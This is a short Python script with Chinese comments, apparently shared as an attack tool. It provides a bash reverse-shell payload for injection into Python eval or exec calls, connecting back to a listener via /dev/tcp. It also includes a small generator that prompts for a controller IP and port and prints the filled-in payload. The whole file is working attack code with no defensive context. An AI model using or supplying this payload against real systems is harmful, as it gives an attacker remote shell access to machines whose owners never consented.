#by leeya_bug

#适用于eval、exec等函数
#在某些发行版上有可能不成功(例如Kali Linux)

#Payload: 
if False:
    __import__('os').system('bash -i >& /dev/tcp/192.168.31.228/6333 0>&1')

#Payload生成
IP = input('请输入控制端IP: ')
PORT = input('请输入控制端端口: ')
print(f'''__import__('os').system('bash -i >& /dev/tcp/{IP}/{PORT} 0>&1')''')
